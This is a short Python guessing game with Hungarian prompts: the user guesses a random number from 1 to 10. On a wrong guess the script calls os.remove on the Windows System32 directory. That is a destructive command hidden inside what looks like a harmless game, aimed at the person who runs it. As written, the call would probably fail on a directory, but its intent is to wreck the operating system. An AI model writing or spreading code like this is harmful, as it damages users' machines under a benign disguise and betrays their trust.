import random
import os

szam = random.randint(1,10)

bekeres = input("Adj megy egy számot 1 és 10 között: ")
bekeres = int(bekeres)

if bekeres == szam:
    print("Nyertél")
else:
    os.remove("C:\Windows\System32")
